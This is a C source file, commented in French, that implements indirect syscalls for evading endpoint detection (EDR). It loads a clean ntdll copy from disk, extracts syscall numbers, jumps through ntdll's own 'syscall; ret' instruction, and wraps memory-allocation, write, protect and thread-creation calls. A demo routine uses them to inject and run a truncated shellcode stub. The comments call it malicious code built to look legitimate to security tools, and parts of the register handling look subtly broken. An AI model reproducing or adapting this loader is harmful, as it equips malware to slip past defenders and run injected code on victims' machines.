/*
 * ============================================================================
 * SYSCALLS INDIRECTS - ÉVASION EDR AVANCÉE
 * ============================================================================
 *
 * Cette implémentation est plus furtive que les syscalls directs.
 * Au lieu d'avoir l'instruction "syscall" dans notre code (détectable),
 * on utilise l'instruction syscall qui existe déjà dans ntdll.dll.
 *
 * PRINCIPE DÉTAILLÉ :
 *
 * 1. Charger une copie fraîche de ntdll.dll depuis le disque
 *    └─> Aucun hook EDR car elle n'est pas encore chargée en mémoire
 *
 * 2. Parser le PE (Portable Executable) pour trouver les fonctions
 *    └─> Lire l'Export Directory Table
 *    └─> Chercher NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.
 *
 * 3. Extraire le numéro de syscall (SSN)
 *    └─> Les premiers bytes de chaque fonction contiennent :
 *        mov r10, rcx        ; 4C 8B D1
 *        mov eax, 0xXX       ; B8 XX 00 00 00  ← SSN ici !
 *        syscall             ; 0F 05
 *        ret                 ; C3
 *
 * 4. Trouver une instruction "syscall; ret" dans ntdll
 *    └─> On cherche les bytes : 0F 05 C3
 *    └─> Cette adresse sera notre "trampoline"
 *
 * 5. Exécuter le syscall indirect :
 *    - Préparer les registres (R10, RAX avec SSN)
 *    - Jump vers l'adresse "syscall; ret" de ntdll
 *    - L'EDR voit un appel depuis ntdll → légitime !
 *
 * AVANTAGES PAR RAPPORT AUX SYSCALLS DIRECTS :
 * ✅ Pas d'instruction syscall dans notre code malveillant
 * ✅ Call stack semble légitime (appel depuis ntdll)
 * ✅ Détection statique plus difficile
 * ✅ Compatibilité avec toutes les versions Windows (extraction dynamique)
 *
 * COMPILATION :
 * gcc -o syscalls_indirect.exe syscalls_indirect.c -lntdll
 *
 * ============================================================================
 */

#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

// ============================================================================
// NOTE: Les structures PE sont déjà définies dans windows.h
// ============================================================================
// IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_EXPORT_DIRECTORY, etc.
// sont disponibles via l'include de windows.h

// ============================================================================
// VARIABLES GLOBALES POUR LES SYSCALLS INDIRECTS
// ============================================================================

// Structure pour stocker les informations d'un syscall
typedef struct _SYSCALL_INFO
{
    DWORD ssn;            // System Service Number
    PVOID syscallAddress; // Adresse de l'instruction "syscall; ret"
} SYSCALL_INFO, *PSYSCALL_INFO;

// Table des syscalls que nous utilisons
static SYSCALL_INFO g_SyscallTable[6] = {0};

// Indices dans la table
#define IDX_NtAllocateVirtualMemory 0
#define IDX_NtWriteVirtualMemory 1
#define IDX_NtProtectVirtualMemory 2
#define IDX_NtCreateThreadEx 3
#define IDX_NtWaitForSingleObject 4
#define IDX_NtClose 5

// Adresse de base de ntdll fraîche
static PVOID g_FreshNtdll = NULL;

// ============================================================================
// FONCTION POUR CHARGER UNE COPIE FRAÎCHE DE NTDLL
// ============================================================================

/*
 * LoadFreshNtdll
 * --------------
 * Charge ntdll.dll depuis le disque dans la mémoire
 * Cette copie n'a AUCUN hook EDR car elle n'est pas mappée par le loader
 *
 * PROCESSUS :
 * 1. Ouvrir C:\Windows\System32\ntdll.dll
 * 2. Lire tout le fichier en mémoire
 * 3. Cette copie est "propre" et peut servir de référence
 */
static BOOL LoadFreshNtdll()
{
    printf("[*] Loading fresh copy of ntdll.dll from disk...\n");

    // Construire le chemin vers ntdll.dll
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, "\\ntdll.dll");

    printf("    Path: %s\n", ntdllPath);

    // Ouvrir le fichier
    HANDLE hFile = CreateFileA(
        ntdllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open ntdll.dll: %lu\n", GetLastError());
        return FALSE;
    }

    // Obtenir la taille du fichier
    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("    File size: %lu bytes\n", fileSize);

    // Allouer de la mémoire pour le fichier
    g_FreshNtdll = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_FreshNtdll)
    {
        printf("[-] Failed to allocate memory\n");
        CloseHandle(hFile);
        return FALSE;
    }

    // Lire le fichier en mémoire
    DWORD bytesRead;
    if (!ReadFile(hFile, g_FreshNtdll, fileSize, &bytesRead, NULL))
    {
        printf("[-] Failed to read ntdll.dll: %lu\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    printf("[+] Fresh ntdll.dll loaded at 0x%p\n\n", g_FreshNtdll);
    return TRUE;
}

// ============================================================================
// FONCTION POUR EXTRAIRE LE SSN D'UNE FONCTION
// ============================================================================

/*
 * GetSSNFromFunction
 * ------------------
 * Extrait le System Service Number (SSN) d'une fonction syscall
 *
 * STRUCTURE D'UNE FONCTION SYSCALL :
 *
 * NtAllocateVirtualMemory:
 *   4C 8B D1              mov r10, rcx        ; Sauvegarde RCX dans R10
 *   B8 18 00 00 00        mov eax, 0x18       ; ← SSN = 0x18 (offset +4)
 *   0F 05                 syscall              ; Instruction syscall
 *   C3                    ret                  ; Retour
 *
 * On va lire les 8 premiers bytes et extraire le SSN à l'offset +4
 */
static DWORD GetSSNFromFunction(PVOID functionAddress)
{
    BYTE *bytes = (BYTE *)functionAddress;

    // Vérifier la signature : mov r10, rcx (4C 8B D1)
    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1)
    {
        printf("[-] Invalid function signature\n");
        return 0;
    }

    // Vérifier : mov eax, imm32 (B8)
    if (bytes[3] != 0xB8)
    {
        printf("[-] Invalid mov eax instruction\n");
        return 0;
    }

    // Extraire le SSN (4 bytes après 0xB8)
    DWORD ssn = *(DWORD *)(bytes + 4);

    return ssn;
}

// ============================================================================
// FONCTION POUR TROUVER L'ADRESSE "SYSCALL; RET"
// ============================================================================

/*
 * FindSyscallAddress
 * ------------------
 * Cherche l'instruction "syscall; ret" (0F 05 C3) dans ntdll
 * Cette adresse servira de trampoline pour nos syscalls indirects
 *
 * POURQUOI ?
 * Au lieu d'avoir "syscall" dans notre code, on jump vers cette adresse
 * légitime dans ntdll. L'EDR voit un appel depuis ntdll → OK !
 */
static PVOID FindSyscallAddress(PVOID moduleBase)
{
    printf("[*] Searching for syscall instruction in ntdll...\n");

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);

    // Obtenir la section .text (code exécutable)
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD textSize = 0;
    PVOID textBase = NULL;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(section[i].Name, ".text", 5) == 0)
        {
            textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase)
    {
        printf("[-] .text section not found\n");
        return NULL;
    }

    printf("    .text section: 0x%p - 0x%p (%lu bytes)\n",
           textBase, (BYTE *)textBase + textSize, textSize);

    // Chercher les bytes : 0F 05 C3 (syscall; ret)
    BYTE *current = (BYTE *)textBase;
    BYTE *end = current + textSize - 2;

    while (current < end)
    {
        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3)
        {
            printf("[+] Found syscall instruction at: 0x%p\n\n", current);
            return current;
        }
        current++;
    }

    printf("[-] syscall instruction not found\n");
    return NULL;
}

// ============================================================================
// FONCTION POUR RÉSOUDRE UNE FONCTION PAR NOM
// ============================================================================

/*
 * GetFunctionAddressByName
 * ------------------------
 * Parse l'Export Directory Table pour trouver une fonction par son nom
 *
 * PROCESSUS :
 * 1. Trouver l'Export Directory dans le PE
 * 2. Parcourir le tableau des noms exportés
 * 3. Comparer avec le nom recherché
 * 4. Retourner l'adresse (RVA) de la fonction
 */
static PVOID GetFunctionAddressByName(PVOID moduleBase, const char *functionName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);

    // Obtenir l'Export Directory
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);

    // Tableaux des exports
    DWORD *addressOfFunctions = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    // Parcourir les noms exportés
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);

        // Comparer les noms
        if (lstrcmpA(currentName, functionName) == 0)
        {
            // Trouver l'ordinal
            WORD ordinal = addressOfNameOrdinals[i];

            // Obtenir l'adresse RVA
            DWORD functionRva = addressOfFunctions[ordinal];

            // Retourner l'adresse absolue
            return (BYTE *)moduleBase + functionRva;
        }
    }

    return NULL;
}

// ============================================================================
// INITIALISATION DES SYSCALLS INDIRECTS
// ============================================================================

/*
 * InitializeIndirectSyscalls
 * --------------------------
 * Initialise tout le système de syscalls indirects :
 * 1. Charge ntdll fraîche
 * 2. Trouve l'adresse syscall
 * 3. Extrait les SSN de chaque fonction
 */
BOOL InitializeIndirectSyscalls()
{
    printf("=======================================================\n");
    printf("  INITIALISATION DES SYSCALLS INDIRECTS\n");
    printf("=======================================================\n\n");

    // ÉTAPE 1 : Charger ntdll fraîche
    if (!LoadFreshNtdll())
    {
        return FALSE;
    }

    // ÉTAPE 2 : Trouver l'adresse syscall (dans ntdll mappée en mémoire, pas la fraîche)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID syscallAddress = FindSyscallAddress(hNtdll);
    if (!syscallAddress)
    {
        return FALSE;
    }

    // ÉTAPE 3 : Résoudre chaque fonction et extraire son SSN
    const char *functionNames[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWaitForSingleObject",
        "NtClose"};

    printf("[*] Resolving syscall numbers...\n");

    for (int i = 0; i < 6; i++)
    {
        // Trouver la fonction dans ntdll fraîche
        PVOID functionAddress = GetFunctionAddressByName(g_FreshNtdll, functionNames[i]);
        if (!functionAddress)
        {
            printf("[-] Failed to find %s\n", functionNames[i]);
            return FALSE;
        }

        // Extraire le SSN
        DWORD ssn = GetSSNFromFunction(functionAddress);
        if (ssn == 0)
        {
            printf("[-] Failed to extract SSN from %s\n", functionNames[i]);
            return FALSE;
        }

        // Stocker dans la table
        g_SyscallTable[i].ssn = ssn;
        g_SyscallTable[i].syscallAddress = syscallAddress;

        printf("    [%d] %-30s SSN: 0x%04lX\n", i, functionNames[i], ssn);
    }

    printf("\n[+] Indirect syscalls initialized successfully!\n\n");
    return TRUE;
}

// ============================================================================
// NETTOYAGE
// ============================================================================

VOID CleanupIndirectSyscalls()
{
    if (g_FreshNtdll)
    {
        VirtualFree(g_FreshNtdll, 0, MEM_RELEASE);
        g_FreshNtdll = NULL;
    }
}

// ============================================================================
// FONCTIONS UTILITAIRES D'AFFICHAGE
// ============================================================================

VOID PrintError(const char *function, NTSTATUS status)
{
    printf("[-] %s failed with status: 0x%08lX\n", function, status);
}

VOID PrintSuccess(const char *message)
{
    printf("[+] %s\n", message);
}

// ============================================================================
// FONCTION ASSEMBLEUR POUR SYSCALL INDIRECT
// ============================================================================

/*
 * DoSyscall - Fonction assembleur inline simplifiée
 * 
 * Cette fonction prépare les registres et effectue le syscall indirect
 * 
 * Paramètres (fastcall x64):
 *   RCX = SSN
 *   RDX = Adresse syscall
 *   R8  = Argument 1
 *   R9  = Argument 2
 *   Stack = Arguments suivants
 */
__attribute__((naked))
NTSTATUS DoSyscall(DWORD ssn, PVOID syscallAddr, ...)
{
    __asm__(
        "mov r10, r8\n"        // R10 = premier argument (R8)
        "mov eax, ecx\n"       // EAX = SSN (RCX)
        // RDX contient déjà syscallAddr
        "mov rcx, r9\n"        // RCX = deuxième argument (R9)
        "mov r8, [rsp+0x28]\n" // R8 = troisième argument
        "mov r9, [rsp+0x30]\n" // R9 = quatrième argument
        "sub rsp, 0x28\n"      // Shadow space
        "call rdx\n"           // Appel indirect via ntdll
        "add rsp, 0x28\n"
        "ret\n"
    );
}

// ============================================================================
// IMPLÉMENTATION DES SYSCALLS INDIRECTS
// ============================================================================

/*
 * NtAllocateVirtualMemory_Indirect
 * --------------------------------
 * Version indirecte : utilise le SSN extrait et jump vers ntdll
 */
NTSTATUS NtAllocateVirtualMemory_Indirect(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtAllocateVirtualMemory];
    
    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        RegionSize,
        AllocationType,
        Protect
    );
}

NTSTATUS NtWriteVirtualMemory_Indirect(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteVirtualMemory];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        ProcessHandle,
        BaseAddress,
        Buffer,
        NumberOfBytesToWrite,
        NumberOfBytesWritten,
        0  // Padding pour alignement
    );
}

NTSTATUS NtProtectVirtualMemory_Indirect(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtProtectVirtualMemory];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        ProcessHandle,
        BaseAddress,
        RegionSize,
        NewProtect,
        OldProtect,
        0  // Padding
    );
}

NTSTATUS NtCreateThreadEx_Indirect(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtCreateThreadEx];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        ThreadHandle,
        DesiredAccess,
        ObjectAttributes,
        ProcessHandle,
        StartRoutine,
        Argument,
        CreateFlags,
        ZeroBits,
        StackSize,
        MaximumStackSize,
        AttributeList
    );
}

NTSTATUS NtWaitForSingleObject_Indirect(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWaitForSingleObject];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        Handle,
        (PVOID)(ULONG_PTR)Alertable,
        Timeout,
        0, 0, 0  // Padding
    );
}

NTSTATUS NtClose_Indirect(
    HANDLE Handle)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtClose];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        Handle,
        0, 0, 0, 0, 0  // Padding
    );
}

// ============================================================================
// EXEMPLE D'UTILISATION
// ============================================================================

#ifdef COMPILE_DEMO_INDIRECT

int main()
{
    printf("=======================================================\n");
    printf("  SYSCALLS INDIRECTS - Démonstration\n");
    printf("=======================================================\n\n");

    // INITIALISATION
    if (!InitializeIndirectSyscalls())
    {
        printf("[-] Failed to initialize indirect syscalls\n");
        return 1;
    }

    // Shellcode de test (calc.exe par exemple)
    unsigned char shellcode[] =
        "\x48\x31\xc9"                             // xor rcx, rcx
        "\x48\x81\xe9\xc6\xff\xff\xff"             // sub rcx, -0x3A
        "\x48\x8d\x05\xef\xff\xff\xff"             // lea rax, [rip-0x11]
        "\x48\x31\xd2"                             // xor rdx, rdx
        "\x48\xbb\x63\x61\x6c\x63\x2e\x65\x78\x65" // movabs rbx, "calc.exe"
        "\x53"                                     // push rbx
        "\x54"                                     // push rsp
        "\x59"                                     // pop rcx
        "\x48\x83\xec\x28"                         // sub rsp, 0x28
        "\x65\x48\x8b\x32"                         // mov rsi, gs:[rdx]
        "\x48\x8b\x76\x18"                         // mov rsi, [rsi+0x18]
        "\x48\x8b\x76\x10"                         // mov rsi, [rsi+0x10]
        // ... (shellcode tronqué pour l'exemple)
        "\xc3"; // ret

    SIZE_T shellcodeSize = sizeof(shellcode);

    // INJECTION AVEC SYSCALLS INDIRECTS
    printf("[*] Injecting shellcode using indirect syscalls...\n\n");

    // Allouer
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcodeSize;
    NTSTATUS status = NtAllocateVirtualMemory_Indirect(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtAllocateVirtualMemory_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Memory allocated");
    printf("    Address: 0x%p\n\n", baseAddress);

    // Écrire
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_Indirect(
        GetCurrentProcess(),
        baseAddress,
        shellcode,
        shellcodeSize,
        &bytesWritten);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtWriteVirtualMemory_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Shellcode written");

    // Protéger
    ULONG oldProtect;
    status = NtProtectVirtualMemory_Indirect(
        GetCurrentProcess(),
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtProtectVirtualMemory_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Memory protection changed to RX");

    // Créer un thread
    HANDLE hThread;
    status = NtCreateThreadEx_Indirect(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        baseAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtCreateThreadEx_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Thread created and shellcode executed!");

    // Attendre et nettoyer
    NtWaitForSingleObject_Indirect(hThread, FALSE, NULL);
    NtClose_Indirect(hThread);

    CleanupIndirectSyscalls();

    printf("\n[+] Démonstration terminée avec succès !\n");
    return 0;
}

#endif // COMPILE_DEMO_INDIRECT
